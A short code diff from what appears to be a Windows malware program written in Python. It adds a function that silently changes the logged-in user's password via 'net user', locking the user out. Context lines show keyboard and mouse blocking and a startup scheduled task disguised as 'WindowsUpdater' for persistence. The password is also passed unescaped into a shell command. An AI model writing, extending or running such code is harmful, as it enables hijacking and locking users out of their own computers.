@@ -110,6 +110,9 @@ def unblock_input():
   kb_listener.stop()
   m_listener.stop()
 
+def change_password(new_password):
+  os.popen(f"net user {os.getlogin()} {new_password}")
+  
 def bootup(): #USING SCHEDULED TASKS
   try:
     os.popen(f"schtasks /create /sc ONSTART /tn WindowsUpdater /tr {os.path.dirname(os.path.abspath(__file__))}\\main.py")
